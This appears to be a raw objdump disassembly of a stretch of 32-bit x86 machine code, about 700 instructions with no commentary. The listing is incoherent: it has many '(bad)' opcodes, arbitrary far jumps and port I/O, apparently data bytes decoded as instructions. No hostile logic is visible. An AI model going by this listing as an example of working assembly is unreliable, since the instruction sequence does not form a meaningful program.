  403158:	pop    esi
  403159:	pop    esi
  40315a:	jmp    0x73fc4e96
  40315f:	scas   eax,DWORD PTR es:[edi]
  403160:	mov    ebp,0x44ae2f5f
  403165:	jmp    0xe77f:0x1f9f5cdf
  40316c:	dec    edx
  40316d:	push   eax
  40316e:	pop    ebp
  40316f:	push   0xffffffcc
  403171:	test   DWORD PTR [ebx+ecx*2],ecx
  403174:	xlat   BYTE PTR ds:[ebx]
  403175:	fidivr WORD PTR [ebx+edx*8-0x6e]
  403179:	out    dx,al
  40317a:	retf   0xa6ff
  40317d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40317e:	aas    
  40317f:	dec    ecx
  403180:	out    0xff,al
  403182:	ja     0x403185
  403184:	ds dec edi
  403186:	loop   0x4031e4
  403188:	sub    eax,0x2171279d
  40318d:	dec    ecx
  40318e:	cmp    edx,esi
  403190:	xor    al,0xb9
  403192:	inc    ebp
  403193:	pushf  
  403194:	pop    es
  403195:	idiv   BYTE PTR [esi+0x4634db01]
  40319b:	pinsrw mm4,WORD PTR [ebx],0xc5
  40319f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4031a0:	cmp    DWORD PTR [edi+0x21],esi
  4031a3:	adc    BYTE PTR [ebp+0x3a4b4ba0],bl
  4031a9:	stos   DWORD PTR es:[edi],eax
  4031aa:	mov    eax,0x86d54fdd
  4031af:	or     eax,0x2f443ed8
  4031b4:	cld    
  4031b5:	(bad)  
  4031b6:	or     BYTE PTR [eax+0x3b5aed56],al
  4031bc:	std    
  4031bd:	push   ds
  4031be:	mov    dh,0x1c
  4031c0:	and    bl,BYTE PTR [ebp+0x35]
  4031c3:	data16 add bh,BYTE PTR [ebp-0x3581b44e]
  4031ca:	pusha  
  4031cb:	xor    BYTE PTR [edi-0x583375ae],al
  4031d1:	xchg   ecx,eax
  4031d2:	mov    ch,0x60
  4031d4:	vmwrite eax,DWORD PTR [eax+0x5a618ef]
  4031db:	lods   al,BYTE PTR ds:[esi]
  4031dc:	fistp  QWORD PTR [ecx*8-0x7162f672]
  4031e3:	xor    DWORD PTR [esi-0x5e],ecx
  4031e6:	xlat   BYTE PTR ds:[ebx]
  4031e7:	cwde   
  4031e8:	and    al,0x9d
  4031ea:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4031eb:	mov    eax,0x52d34ed0
  4031f0:	mov    fs,WORD PTR [ebx+eiz*1-0xb]
  4031f4:	aad    0x7e
  4031f6:	fmul   DWORD PTR [eax-0x49]
  4031f9:	and    BYTE PTR [eax+0x52226c37],ch
  4031ff:	jno    0x40319c
  403201:	add    cl,BYTE PTR [edi-0x166f63a8]
  403207:	int3   
  403208:	or     bh,bl
  40320a:	push   edx
  40320b:	push   ebp
  40320c:	push   0x3c
  40320e:	lods   eax,DWORD PTR ds:[esi]
  40320f:	arpl   WORD PTR [edi+0x47e3f674],dx
  403215:	mov    cl,0x92
  403217:	popa   
  403218:	ret    
  403219:	push   cs
  40321a:	(bad)  
  40321b:	frstor [eax+esi*4]
  40321e:	add    BYTE PTR [edi],0xd1
  403221:	std    
  403222:	loopne 0x4031b0
  403224:	adc    BYTE PTR [edx],bh
  403226:	imul   esp,DWORD PTR [esi+0x6f6d60f7],0xe341aa9a
  403230:	sub    DWORD PTR [edi],esp
  403232:	cli    
  403233:	and    eax,0x11f67bfb
  403238:	jmp    0x71a7:0x3a538893
  40323f:	pop    edi
  403240:	jnp    0x4032a7
  403242:	inc    esp
  403243:	in     eax,dx
  403244:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403245:	xor    dh,BYTE PTR [ebx+0x13]
  403248:	cmp    eax,DWORD PTR [ebx-0x449b4de6]
  40324e:	pop    ebx
  40324f:	sbb    al,0x7b
  403251:	loop   0x40320d
  403253:	push   es
  403254:	jo     0x4031e3
  403256:	call   0xf7c6c1ef
  40325b:	cmp    bl,0x7a
  40325e:	nop
  40325f:	fneni(8087 only) 
  403261:	(bad)  
  403262:	mov    ds:0xfdd85eca,al
  403267:	mov    eax,0xd74147c4
  40326c:	in     al,0x8e
  40326e:	test   BYTE PTR [esi],bh
  403270:	cmc    
  403271:	ja     0x403213
  403273:	push   cs
  403274:	sub    DWORD PTR [eax+esi*2],esp
  403277:	loopne 0x4031fa
  403279:	fcomip st,st(2)
  40327b:	cmp    al,0x5d
  40327d:	stos   DWORD PTR es:[edi],eax
  40327e:	push   ds
  40327f:	aas    
  403280:	ins    BYTE PTR es:[edi],dx
  403281:	dec    esi
  403282:	inc    edx
  403283:	and    al,0xcd
  403285:	xlat   BYTE PTR ds:[ebx]
  403286:	rcl    ah,0x40
  403289:	jbe    0x4032ae
  40328b:	mov    ah,0x66
  40328d:	add    BYTE PTR [ecx-0x12c420f3],bl
  403293:	mov    bh,0x19
  403295:	test   cl,dh
  403297:	rcr    BYTE PTR [edi],1
  403299:	and    ebp,DWORD PTR [ebx-0x10334a68]
  40329f:	and    edx,DWORD PTR ds:0x926cc3f1
  4032a5:	mov    eax,0x7a43d42f
  4032aa:	aad    0xba
  4032ac:	mov    edi,0xa40fd3ad
  4032b1:	and    al,dl
  4032b3:	out    0xcb,eax
  4032b5:	add    al,0xa3
  4032b7:	xchg   edx,eax
  4032b8:	add    al,0x2c
  4032ba:	cmp    eax,DWORD PTR [eax+0x3f]
  4032bd:	(bad)  
  4032be:	aam    0x1c
  4032c0:	pop    esp
  4032c1:	and    al,BYTE PTR [ebx]
  4032c3:	sub    dl,BYTE PTR [esi]
  4032c5:	push   ss
  4032c6:	push   edx
  4032c7:	adc    DWORD PTR [esi-0x24],ebx
  4032ca:	dec    ebp
  4032cb:	ret    
  4032cc:	(bad)  [eax]
  4032ce:	pop    ebx
  4032d0:	mov    ah,0x65
  4032d2:	bound  eax,QWORD PTR [edx+edx*2]
  4032d5:	push   esp
  4032d6:	bnd jmp 0x10fd0328
  4032dc:	and    bl,bl
  4032de:	jecxz  0x40333e
  4032e0:	nop
  4032e1:	call   0xfa0ed4ea
  4032e6:	popa   
  4032e7:	(bad)  
  4032e8:	out    dx,eax
  4032e9:	mov    BYTE PTR [eax],al
  4032eb:	shl    BYTE PTR [ecx-0x4f74c903],cl
  4032f1:	add    esi,eax
  4032f3:	and    BYTE PTR ds:0xcfcc8dc,cl
  4032f9:	xor    bl,BYTE PTR [ebp-0x34668330]
  4032ff:	jbe    0x403302
  403301:	or     DWORD PTR [edx-0x4b964862],esp
  403307:	jno    0x40337b
  403309:	jg     0x403305
  40330b:	and    al,BYTE PTR ds:0x7883de4e
  403311:	lds    edi,FWORD PTR [edi+ebp*2+0x50]
  403315:	fsub   DWORD PTR [edx+edx*4]
  403318:	pop    edi
  403319:	jne    0x40337e
  40331b:	xchg   edx,eax
  40331c:	xor    BYTE PTR [esi],0xa8
  40331f:	add    dh,BYTE PTR [edx+edi*8+0x393a119b]
  403326:	repnz imul ebp,DWORD PTR ds:[eax-0x515618e4],0xffffffb2
  40332f:	mov    ds:0x1a7c60ae,al
  403334:	repz and bl,BYTE PTR [esp+ecx*2]
  403338:	mov    dl,0xaa
  40333a:	(bad)  
  40333c:	(bad)  
  40333d:	jecxz  0x4032e1
  40333f:	loope  0x403313
  403341:	pop    ds
  403342:	adc    BYTE PTR [edi-0x4f3bb9ae],0xed
  403349:	into   
  40334a:	mov    dl,0x62
  40334c:	push   edi
  40334d:	inc    edx
  40334e:	pop    ebx
  40334f:	icebp  
  403350:	pusha  
  403351:	adc    al,0x33
  403353:	popf   
  403354:	call   0xe755:0x5658be0e
  40335b:	jecxz  0x4033da
  40335d:	daa    
  40335e:	push   ebp
  40335f:	in     al,0xdd
  403361:	mov    bl,0x33
  403363:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403364:	jns    0x4033ad
  403366:	xor    eax,0xa5fd3f9d
  40336b:	in     al,dx
  40336c:	xchg   edi,eax
  40336d:	xchg   esp,eax
  40336e:	inc    esp
  40336f:	sub    edi,DWORD PTR [esi]
  403371:	loopne 0x40337f
  403373:	fs inc esp
  403375:	and    al,0xa9
  403377:	sbb    BYTE PTR [ebx],dh
  403379:	stos   DWORD PTR es:[edi],eax
  40337a:	rol    DWORD PTR es:[ebx-0x8f7be87],1
  403381:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403382:	retf   
  403383:	jle    0x4033a3
  403385:	mov    esp,0x6325b4ed
  40338a:	ftst   
  40338c:	or     bl,ch
  40338e:	xchg   edi,eax
  40338f:	push   ecx
  403390:	mov    bh,0x35
  403392:	add    eax,0xbe42f962
  403397:	dec    ecx
  403398:	iret   
  403399:	jge    0x4033cf
  40339b:	cmp    ecx,ebx
  40339d:	jge    0x4033f4
  40339f:	add    al,BYTE PTR [edi]
  4033a1:	mov    edi,0xcc3ea0e3
  4033a6:	jbe    0x403367
  4033a8:	cmp    bh,BYTE PTR [edx]
  4033aa:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4033ab:	cdq    
  4033ac:	addr16 mov ebp,0xdc8799f
  4033b2:	bound  esp,QWORD PTR [eax-0x3bb04727]
  4033b8:	cmp    cl,dh
  4033ba:	in     eax,dx
  4033bb:	call   0x55c8:0xb0f57c36
  4033c2:	rol    DWORD PTR [esi+0x21],0xa7
  4033c6:	mov    ds:0xeaba468a,al
  4033cb:	(bad)  
  4033cc:	ins    DWORD PTR es:[edi],dx
  4033cd:	(bad)  
  4033ce:	mov    esi,0x10b90c4c
  4033d3:	mov    ebp,0x36fca5dd
  4033d8:	aad    0xb3
  4033da:	call   0x35f44768
  4033df:	idiv   DWORD PTR [edx]
  4033e1:	or     ah,BYTE PTR [esi+0x6c0ecd4d]
  4033e7:	inc    BYTE PTR [ecx-0x236c2c16]
  4033ed:	test   esp,eax
  4033ef:	test   DWORD PTR [edi+0x73ae57b5],ebp
  4033f5:	xor    dh,BYTE PTR [ebx+0x15670ba2]
  4033fb:	addr16 in eax,dx
  4033fd:	jp     0x40346f
  4033ff:	test   BYTE PTR [ebx],ch
  403401:	push   ebp
  403402:	std    
  403403:	jmp    0x38930af9
  403408:	mov    esp,ebx
  40340a:	push   edi
  40340b:	(bad)  
  40340c:	rcl    BYTE PTR [esi-0x49],0xc0
  403410:	out    dx,eax
  403411:	ins    DWORD PTR es:[edi],dx
  403412:	jge    0x403457
  403414:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403415:	and    BYTE PTR [ecx-0x5a],0x82
  403419:	jno    0x40340d
  40341b:	fmul   DWORD PTR [ebp-0x72]
  40341e:	addr16 mov ecx,0x8bab2c8e
  403424:	mov    esi,0xfdf9ef89
  403429:	dec    esp
  40342a:	jg     0x40345f
  40342c:	enter  0x6dbb,0x50
  403430:	int3   
  403431:	ret    
  403432:	test   DWORD PTR [eax+0x55],edi
  403435:	pop    esp
  403436:	lea    eax,[esi-0x45abbdef]
  40343c:	lock sub BYTE PTR [esi],dl
  40343f:	lea    ebx,[ebp+0x641f52f9]
  403445:	fist   DWORD PTR [ecx+edi*8+0x25]
  403449:	xor    esp,eax
  40344b:	mov    bh,bh
  40344d:	ret    0x8fc7
  403450:	xor    bh,ch
  403452:	in     al,0x60
  403454:	and    BYTE PTR [edx+ebx*1],al
  403457:	shr    DWORD PTR [ebx],cl
  403459:	lds    esp,FWORD PTR [ebx+0x3d989ec5]
  40345f:	icebp  
  403460:	push   ebp
  403461:	jge    0x4034ae
  403463:	std    
  403464:	stos   DWORD PTR es:[edi],eax
  403465:	cs pop ebx
  403467:	cmp    DWORD PTR [ecx-0x14],ebx
  40346a:	imul   eax,DWORD PTR [eax+0x27],0x79
  40346e:	pop    eax
  40346f:	lods   eax,DWORD PTR ds:[esi]
  403470:	int    0x14
  403472:	mov    WORD PTR [ebp+0x1f35ca13],ss
  403478:	in     eax,0xb9
  40347a:	inc    eax
  40347b:	retf   0x38cd
  40347e:	dec    esi
  40347f:	ja     0x4034ee
  403481:	pop    ds
  403482:	mov    cl,0x86
  403484:	pop    ds
  403485:	pop    ebx
  403486:	lock push eax
  403488:	xor    DWORD PTR [ecx],edx
  40348a:	pop    esi
  40348b:	cmp    dh,BYTE PTR [esi+ecx*2]
  40348e:	call   0x702e8c94
  403493:	leave  
  403494:	imul   esp,DWORD PTR [eax+0x28424f3a],0x5c29f1b3
  40349e:	ja     0x4034da
  4034a0:	pop    edx
  4034a1:	stos   DWORD PTR es:[edi],eax
  4034a2:	cmp    al,0x34
  4034a4:	sub    dl,BYTE PTR [esi]
  4034a6:	jb     0x40342d
  4034a8:	xchg   ebp,eax
  4034a9:	xchg   ecx,esi
  4034ab:	ja     0x403528
  4034ad:	jno    0x403460
  4034af:	inc    eax
  4034b0:	cmp    ecx,edi
  4034b2:	repz cmc 
  4034b4:	jb     0x403455
  4034b6:	or     al,0xfc
  4034b8:	dec    esi
  4034b9:	jbe    0x4034cd
  4034bb:	push   ds
  4034bc:	sbb    eax,0x60381c1b
  4034c1:	outs   dx,DWORD PTR ds:[esi]
  4034c2:	test   al,0xd3
  4034c4:	pop    ds
  4034c5:	cwde   
  4034c6:	adc    BYTE PTR [ecx],al
  4034c8:	call   0xa323f479
  4034cd:	dec    ecx
  4034ce:	pop    ebp
  4034cf:	jo     0x403455
  4034d1:	hlt    
  4034d2:	cld    
  4034d3:	xchg   DWORD PTR [edx+ecx*1-0x12],ebp
  4034d7:	sub    BYTE PTR [ebx-0xbff08bb],cl
  4034dd:	lahf   
  4034de:	push   esi
  4034df:	mov    bl,0x82
  4034e1:	pop    ebx
  4034e2:	mov    ds:0x554c9aa2,al
  4034e7:	cmp    BYTE PTR [esi+0x5d],dl
  4034ea:	xchg   ebx,eax
  4034eb:	cmc    
  4034ec:	inc    ecx
  4034ed:	jne    0x403557
  4034ef:	inc    eax
  4034f0:	popa   
  4034f1:	xchg   edx,eax
  4034f2:	mov    edx,0x5e91627b
  4034f7:	mov    al,0xff
  4034f9:	push   ebx
  4034fa:	xchg   DWORD PTR [edx-0x66],esp
  4034fd:	add    al,0x36
  4034ff:	dec    ecx
  403500:	push   edi
  403501:	sub    ch,BYTE PTR [edi+edi*4]
  403504:	pop    esp
  403505:	adc    ch,ah
  403507:	jg     0x4034eb
  403509:	mov    ds:0x78d89754,al
  40350e:	mov    dl,0x68
  403510:	retf   
  403511:	test   al,0x30
  403513:	jmp    0x4034c6
  403515:	es fs hlt 
  403518:	imul   eax,DWORD PTR [edi-0x6f1e8eb4],0x6b00450a
  403522:	sbb    DWORD PTR [ebx],0xffffffad
  403525:	cmp    eax,0xe880d5bb
  40352a:	iret   
  40352b:	out    0xe,eax
  40352d:	je     0x4034fe
  40352f:	test   ebp,0xf7e26aab
  403535:	mov    ds:0x7131a607,al
  40353a:	xchg   BYTE PTR [ecx+0x488349c5],bl
  403540:	mov    al,ds:0x183219f7
  403545:	mov    cs,esi
  403547:	jbe    0x403520
  403549:	pop    edi
  40354a:	and    ecx,ebp
  40354c:	add    DWORD PTR [ebx+ecx*4],0xc3408e0d
  403553:	or     dh,bl
  403555:	mov    eax,ds:0x56758abc
  40355a:	xlat   BYTE PTR ds:[ebx]
  40355b:	fild   QWORD PTR [esi+eax*1]
  40355e:	xlat   BYTE PTR ds:[ebx]
  40355f:	mov    cl,al
  403561:	ficom  DWORD PTR [ebp+ebp*4+0x644e569]
  403568:	add    eax,0x46df078a
  40356d:	or     DWORD PTR [esi],esp
  40356f:	mov    esp,0x5aa1ab90
  403574:	outs   dx,DWORD PTR ds:[esi]
  403575:	mov    al,ds:0x84928b7f
  40357a:	mov    esp,0xd2466b72
  40357f:	imul   BYTE PTR [edx]
  403581:	fidivr WORD PTR [edi+0x5a]
  403584:	cmp    eax,0xef2cefe6
  403589:	sbb    ebp,edx
  40358b:	bound  ebp,QWORD PTR [eax]
  40358d:	(bad)  
  40358e:	lods   eax,DWORD PTR ds:[esi]
  40358f:	pop    ebx
  403590:	jl     0x403524
  403592:	sub    eax,0x3faa51d0
  403597:	ret    0x5224
  40359a:	aas    
  40359b:	xor    dl,BYTE PTR [eax+0x3d3ecf59]
  4035a1:	sub    edx,DWORD PTR [edx-0x3ab57886]
  4035a7:	add    BYTE PTR [ebp+eax*4+0x29c49c35],bh
  4035ae:	daa    
  4035af:	xor    al,0x91
  4035b1:	mov    ebx,0xabb5f1b7
  4035b6:	out    0xb5,al
  4035b8:	mov    bl,0x94
  4035ba:	std    
  4035bb:	and    DWORD PTR [esi],eax
  4035bd:	cwde   
  4035be:	add    eax,0xb097f56
  4035c3:	adc    DWORD PTR [edi-0x15d91531],esp
  4035c9:	or     al,0xc1
  4035cb:	and    BYTE PTR [ecx-0x54],bh
  4035ce:	add    ch,0xde
  4035d1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4035d2:	mov    esp,0x6db8cfa
  4035d7:	fadd   st,st(0)
  4035d9:	pop    edi
  4035da:	or     BYTE PTR [ebp-0x70],ah
  4035dd:	fwait
  4035de:	ret    
  4035df:	push   ss
  4035e0:	dec    ebp
  4035e1:	(bad)  
  4035e2:	mov    eax,0x275e26b5
  4035e7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4035e8:	es ss sbb eax,0x93ef7fbc
  4035ef:	mov    cl,0x65
  4035f1:	cs mov al,0xb5
  4035f4:	pop    ebp
  4035f5:	imul   ecx,DWORD PTR [edi-0x544b112f],0x438b4349
  4035ff:	jmp    0xaa5a:0x1ca2c9ff
  403606:	test   DWORD PTR [eax],ecx
  403608:	xchg   edi,eax
  403609:	mov    bh,BYTE PTR [eax+0x3f]
  40360c:	sub    DWORD PTR [esi+0x58],edx
  40360f:	clc    
  403610:	rol    BYTE PTR [edi+0x5a],0x54
  403614:	fld    DWORD PTR [edi+0x40]
  403617:	ins    DWORD PTR es:[edi],dx
  403618:	inc    eax
  403619:	int3   
  40361a:	ror    BYTE PTR [ebp-0x76],1
  40361d:	cwde   
  40361e:	push   0x562bc4ef
  403623:	or     al,cl
  403625:	jbe    0x40366f
  403627:	sar    cl,cl
  403629:	pop    edx
  40362a:	std    
  40362b:	fild   DWORD PTR [esi]
  40362d:	and    ebx,ebp
  40362f:	add    al,0xd7
  403631:	fiadd  DWORD PTR [ecx+edi*1+0x60511e01]
  403638:	xchg   DWORD PTR [esi],ebx
  40363a:	xor    BYTE PTR [ebx-0x1a36cdd1],cl
  403640:	xor    BYTE PTR [esi],dh
  403642:	aam    0xf6
  403644:	inc    ebx
  403645:	sub    eax,0x14ca7ff6
  40364a:	es mov esi,0xb56dbc77
  403650:	pop    esp
  403651:	out    dx,eax
  403652:	leave  
  403653:	in     eax,dx
  403654:	mul    bl
  403656:	push   es
  403657:	lds    edx,FWORD PTR [edi+0x5f]
  40365a:	jg     0x403650
  40365c:	mov    edx,0x33ee80d4
  403661:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403662:	sub    al,0xc4
  403664:	mov    BYTE PTR [ebp-0x406e47e7],bl
  40366a:	jmp    0x403608
  40366c:	jbe    0x40365f
  40366e:	mov    ebp,0x7331ad27
  403673:	jge    0x40367d
  403675:	cld    
  403676:	sti    
  403677:	outs   dx,BYTE PTR ds:[esi]
  403678:	outs   dx,DWORD PTR ds:[esi]
  403679:	dec    eax
  40367a:	popa   
  40367b:	mov    bh,0x4f
  40367d:	pushf  
  40367e:	out    0x20,eax
  403680:	push   es
  403681:	pop    esi
  403682:	xor    al,0xa6
  403684:	jecxz  0x403632
  403686:	cmp    BYTE PTR [eax+0x4b96b1b5],ch
  40368c:	nop
  40368d:	push   ss
  40368e:	xor    BYTE PTR [edx+0x7881b276],ch
  403694:	in     al,0x7
  403696:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403697:	shl    dl,1
  403699:	outs   dx,BYTE PTR ds:[esi]
  40369a:	pop    ecx
  40369b:	xor    cl,BYTE PTR [ebx-0x12]
  40369e:	mov    ds:0x8a6deb2,eax
  4036a3:	inc    esp
  4036a4:	add    BYTE PTR [eax],al
  4036a6:	xchg   ebx,eax
  4036a7:	gs mov bl,0xfc
  4036aa:	pop    eax
  4036ab:	jle    0x4036d5
  4036ad:	sar    bh,cl
  4036af:	xchg   ebx,eax
  4036b0:	xor    ebx,ecx
  4036b2:	inc    esp
  4036b3:	nop
  4036b4:	lods   eax,DWORD PTR ds:[esi]
  4036b5:	cmp    DWORD PTR [edi+0x376bd494],ebp
  4036bb:	mov    WORD PTR [ebp-0x20],?
  4036be:	jae    0x4036e8
  4036c0:	jmp    0x4036fe
  4036c2:	ja     0x403681
  4036c4:	shl    DWORD PTR [eax-0x49],0xbd
  4036c8:	xchg   BYTE PTR ds:0xf6b31d84,bh
  4036ce:	loopne 0x4036b0
  4036d0:	fdiv   QWORD PTR [edx+esi*1-0x16]
  4036d4:	fbld   TBYTE PTR [esp]
  4036d7:	in     al,0x96
  4036d9:	xor    bl,ah
  4036db:	jecxz  0x40374c
  4036dd:	popf   
  4036de:	mov    edx,0xb9b338f9
  4036e3:	cli    
  4036e4:	dec    ecx
  4036e5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4036e6:	xlat   BYTE PTR ds:[ebx]
  4036e7:	inc    ebx
  4036e8:	mov    al,ds:0xcc701618
  4036ed:	mov    ch,BYTE PTR [ecx]
  4036ef:	sahf   
  4036f0:	aas    
  4036f1:	pop    ds
  4036f2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4036f3:	pop    es
  4036f4:	pop    edi
  4036f5:	push   ecx
  4036f6:	push   0x62
  4036f8:	push   esp
  4036f9:	(bad)  
  4036fa:	jg     0x4036af
  4036fc:	int3   
  4036fd:	or     DWORD PTR [edx+0x1c],edx
  403700:	xlat   BYTE PTR ds:[ebx]
  403701:	shl    DWORD PTR [ebx-0x22],cl
  403704:	push   esp
  403705:	mov    al,0xa2
  403707:	pop    edi
  403708:	sbb    DWORD PTR [edi+0x4a736041],ebp
  40370e:	jmpw   0x23ff
  403712:	lock cmp ch,ch
  403715:	mov    ch,0x3d
  403717:	ins    BYTE PTR es:[edi],dx
  403718:	fs jge 0x403776
  40371b:	ja     0x403736
  40371d:	aas    
  40371e:	mov    al,ds:0x98ba433a
  403723:	lods   eax,DWORD PTR ds:[esi]
  403724:	adc    eax,0x502cb7c6
  403729:	js     0x403733
  40372b:	inc    ebx
  40372c:	push   esp
  40372d:	xchg   edi,eax
  40372e:	jnp    0x40372f
  403730:	xchg   DWORD PTR [ecx+0xa],esi
  403733:	add    DWORD PTR [edx-0x7a522789],ecx
  403739:	jnp    0x4037ab
  40373b:	nop
  40373c:	mov    al,0xd8
  40373e:	pop    ds
  40373f:	push   es
  403740:	push   0xe746d41f
  403745:	imul   esi,DWORD PTR [esi],0x5f
  403748:	adc    DWORD PTR [esp+ecx*8],ebp
  40374b:	jecxz  0x403794
  40374d:	jo     0x40370c
  40374f:	rcl    DWORD PTR [ebp-0x26],cl
  403752:	fnstsw WORD PTR [edx+0x16d0c57c]
  403758:	inc    edx
  403759:	lods   eax,DWORD PTR ds:[esi]
  40375a:	xchg   esp,eax
  40375b:	xor    BYTE PTR [edi-0x42],ah
  40375e:	sbb    esi,DWORD PTR [ebx-0xf2c2bae]
  403764:	jbe    0x403717
  403766:	sub    esp,DWORD PTR [esi-0x74]
  403769:	sub    al,0xdd
  40376b:	push   eax
  40376c:	add    ch,BYTE PTR [ebp+0x3f6df6f8]
  403772:	inc    ebx
  403773:	inc    DWORD PTR [ecx]
  403775:	push   ebx
  403776:	cmc    
  403777:	scas   al,BYTE PTR es:[edi]
  403778:	and    eax,DWORD PTR [ebp*4+0x74547b0d]
  40377f:	jae    0x40378a
  403781:	and    al,0xe4
  403783:	jmp    0x403768
  403785:	aad    0x53
  403787:	pushf  
  403788:	popa   
  403789:	sbb    DWORD PTR [ecx+0x30],ebx
  40378c:	dec    edx
  40378d:	(bad)  
  40378e:	aam    0xe0
  403790:	out    0xc2,al
  403792:	dec    ebx
  403793:	mov    gs,WORD PTR [esi]
  403795:	out    0x81,eax
  403797:	je     0x40379c
  403799:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40379a:	loop   0x403729
  40379c:	out    0xd9,eax
  40379e:	shl    DWORD PTR [eax+eiz*8],0x3
  4037a2:	stos   DWORD PTR es:[edi],eax
  4037a3:	jmp    0xf138:0xe5b7d5fb
  4037aa:	shl    DWORD PTR [esi+ebp*1-0xf],0x94
  4037af:	mov    dh,0x59
  4037b1:	aas    
  4037b2:	fwait
  4037b3:	leave  
  4037b4:	cmp    BYTE PTR ds:0xa07858c8,0x9a
  4037bb:	aaa    
  4037bc:	cld    
  4037bd:	out    0x4a,al
  4037bf:	popf   
  4037c0:	inc    esi
  4037c1:	jecxz  0x4037c0
  4037c3:	jne    0x403751
  4037c5:	mov    DWORD PTR [edx-0xe],eax
  4037c8:	mov    ah,0x19
  4037ca:	nop
  4037cb:	not    BYTE PTR [eax]
  4037cd:	cmp    bh,ch
  4037cf:	cmp    ch,bh
  4037d1:	int    0xe3
  4037d3:	jne    0x4037c6
  4037d5:	mov    esp,0x535622bc
  4037da:	mov    cl,dh
  4037dc:	popa   
  4037dd:	or     esi,ebx
  4037df:	pop    ecx
  4037e0:	jecxz  0x4037d8
  4037e2:	int    0x25
  4037e4:	lods   eax,DWORD PTR ds:[esi]
  4037e5:	fcom   DWORD PTR [eax]
  4037e7:	outs   dx,BYTE PTR ds:[esi]
  4037e8:	mov    bl,0x1d
  4037ea:	(bad)  
  4037eb:	inc    ecx
  4037ec:	arpl   WORD PTR [esi],dx
  4037ee:	mov    eax,ds:0xef485d73
  4037f3:	dec    ebx
  4037f4:	and    eax,0xbee7c1f2
  4037f9:	add    BYTE PTR [edx+0x36],bh
  4037fc:	cmp    BYTE PTR [ecx-0x6eb1bc62],bl
  403802:	(bad)  
  403803:	adc    ah,bl
  403805:	xor    eax,0x764b8e2
  40380a:	or     ebp,DWORD PTR [ebx]
  40380c:	xchg   esi,eax
  40380d:	inc    ebp
  40380e:	stos   BYTE PTR es:[edi],al
  40380f:	inc    eax
  403810:	inc    ebp
  403811:	scas   al,BYTE PTR es:[edi]
  403812:	xor    eax,0xea20cdf5
  403817:	xchg   esp,eax
  403818:	shr    ch,1
  40381a:	int    0x87
  40381c:	or     esi,DWORD PTR [edx+0x2eba5ae5]
  403822:	imul   edi,DWORD PTR [esi+0x6c],0x35
  403826:	setb   dh
  403829:	mov    esp,0x9dff30f1
  40382e:	adc    eax,0x111cb73d
  403833:	sub    edx,edx
  403835:	mov    bh,0x5b
  403837:	sar    DWORD PTR [eax],1
  403839:	dec    eax
  40383a:	or     al,0x63
  40383c:	sub    eax,DWORD PTR [eax-0x35]
  40383f:	jl     0x40383f
  403841:	jmp    0x37ffd0ff
  403846:	jecxz  0x4038c4
  403848:	jmp    DWORD PTR fs:[ebx+0x39]
  40384c:	dec    esi
  40384d:	div    BYTE PTR [ecx-0x46233224]
  403853:	sbb    eax,0x930df43f
  403858:	or     al,0xd9
  40385a:	and    eax,0xfb9dc5d2
  40385f:	add    al,0x3e
  403861:	pop    es
  403862:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403863:	out    dx,al
  403864:	int3   
  403865:	mov    ds:0xaad6da9a,al
  40386a:	jg     0x403889
  40386c:	ret    0xafbb
  40386f:	fistp  DWORD PTR [ebx+0x4e]
  403872:	jge    0x403838
  403874:	xchg   ecx,eax
  403875:	lods   eax,DWORD PTR ds:[esi]
  403876:	jl     0x403809
  403878:	mov    bl,0xaf
  40387a:	out    dx,eax
  40387b:	imul   esp,DWORD PTR [ecx],0xe7b84622
  403881:	jg     0x40388e
  403883:	sub    ecx,0x55
  403886:	and    ah,cl
  403888:	loopne 0x4038c1
  40388a:	popa   
  40388b:	retf   0xd2f
  40388e:	out    0x50,eax
  403890:	add    edi,DWORD PTR [edx-0x10208d5]
  403896:	lahf   
  403897:	lods   al,BYTE PTR ds:[esi]
  403898:	xchg   DWORD PTR [ebx+eiz*2-0x77],ecx
  40389c:	les    edi,FWORD PTR [esi+0x3e]
  40389f:	xchg   edi,eax
  4038a0:	ror    DWORD PTR [esi+ecx*4],cl
  4038a3:	jae    0x40387e
  4038a5:	fnstcw WORD PTR [esp+ebp*8]
  4038a8:	cmp    BYTE PTR [ebp+0x68f56d07],0x2b
  4038af:	sbb    DWORD PTR [ebx-0x63],0x1d
  4038b3:	pushf  
  4038b4:	jp     0x40388c
  4038b6:	ds xchg esp,eax
  4038b8:	mov    al,ds:0xa81cea7e
  4038be:	sbb    eax,0xfa373f00
  4038c3:	mov    edx,DWORD PTR [ebp+0x5f70f9b1]
  4038c9:	push   edi
  4038ca:	in     eax,dx
  4038cb:	js     0x40385e
  4038cd:	rol    DWORD PTR [eax-0x5f87382d],1
  4038d3:	mov    eax,DWORD PTR [ebx+0x29a0cc32]
  4038d9:	xchg   BYTE PTR [ebx],ch
  4038db:	sub    ebx,edi
  4038dd:	jecxz  0x40392a
  4038df:	stc    
  4038e0:	mov    ?,WORD PTR [edx-0x79]
  4038e3:	std    
  4038e4:	mov    ebp,DWORD PTR [edi+0x39]
  4038e7:	xchg   ecx,eax
  4038e8:	mov    esi,0x4d925df6
  4038ed:	sahf   
  4038ee:	fdivr  DWORD PTR [ecx]
  4038f0:	cli    
  4038f1:	mov    al,0xbe
  4038f3:	fmul   DWORD PTR [edi+ecx*4]
  4038f6:	ins    BYTE PTR es:[edi],dx
  4038f7:	or     bh,BYTE PTR [ebx+edx*4+0x25]
  4038fb:	jmp    0x4038cc
  4038fd:	jmp    0xa3b2:0x848db5f4
  403904:	into   
  403905:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403906:	sar    ecx,0xc0
  403909:	(bad)  
  40390a:	mov    al,ds:0x856089ab
  40390f:	pop    ecx
